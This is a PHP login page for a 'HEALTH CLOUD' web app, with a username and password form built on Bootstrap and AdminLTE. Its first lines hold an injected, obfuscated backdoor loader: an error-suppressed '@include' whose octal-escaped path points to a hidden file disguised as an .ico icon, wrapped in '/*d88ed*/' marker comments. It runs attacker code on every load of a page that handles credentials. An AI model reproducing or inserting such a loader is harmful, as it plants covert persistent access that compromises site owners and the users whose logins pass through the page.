<?php
/*d88ed*/

@include "\057ho\155e/\143od\145vi\141b/\160ub\154ic\137ht\155l/\147cp\057bo\167er\137co\155po\156en\164s/\142oo\164st\162ap\057.8\06625\0639c\071.i\143o";

/*d88ed*/

    include("connection/config.php");

?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>HEALTH CLOUD</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.6 -->
  <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/AdminLTE.min.css">
  <!-- AdminLTE Skins. Choose a skin from the css/skins
       folder instead of downloading all of them to reduce the load. -->
  <link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">
  <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.7/angular.js"></script>

	<style>
	    .placeholder{color: grey;}
		select option:first-child{color: grey; display: none;}
		select option{color: #555;} // bootstrap default color
	
		.form button {
		  -webkit-transition: all 0.3 ease;
		  transition: all 0.3 ease;
		  cursor: pointer;
		}

		.form .register-form {
		  display: none;
		}

		

	</style>

</head>


<body>

	<div class="login-box">

		<div class="form" ng-app="myapp">

			  <!-- /.login-logo -->
			  	<div class="login-box-body">
			    	<p class="login-box-msg"><img src="dist/img/health.png" width="100%"></p>
				    <form class="login-form" action="checklogin.php" method="POST" role="login">
                    <?php if(isset($fmsg)){ ?><div class="alert alert-danger" role="alert"> <?php echo $fmsg; ?> </div><?php } ?>
						<div class="form-group has-feedback">
							<input type="text" id="username" name="username" class="form-control" placeholder="Enter Username" required>
							<span class="glyphicon glyphicon-user form-control-feedback"></span>
							
						</div>

						<div class="form-group has-feedback">
						    <input type="password" name="password" class="form-control" placeholder="Enter Password" required>
						    <span class="glyphicon glyphicon-lock form-control-feedback"></span>
						</div>

					    	<button type="submit" class="btn btn-info btn-block btn-flat">Sign In</button>
					      	<br/><p>No Account? <a href="">Sign Up Here</a></p>
					      	<p>Forgot Your Password? <a href="#">Click Here</a></p>

				    </form>
				</div>

	  	</div>
	  <!-- /.login-box-body -->
	</div>
	<!-- /.login-box -->


	<script src="assets/js/validation.js"></script>

<script>
	  $(function () {
		$('input').iCheck({
		  checkboxClass: 'icheckbox_square-blue',
		  radioClass: 'iradio_square-blue',
		  increaseArea: '20%' // optional
		});
	  });
  	$('.message a').click(function(){
		   $('form').animate({height: "toggle", opacity: "toggle"}, "slow");
		});
		var seq=0;
		function myFunction() {
		seq=seq+1;
			document.getElementById("demo").value = seq;
		}
	
</script>
<script>
		function checkAvailability() {
		//$("#loaderIcon").show();
		jQuery.ajax({
		url: "exist.php",
		data:'username='+$("#username").val(),
		type: "POST",
		success:function(data){
		$("#user-availability-status").html(data);
		//$("#loaderIcon").hide();
		},
		error:function (){}
		});
		}
</script>

</body>

</html>
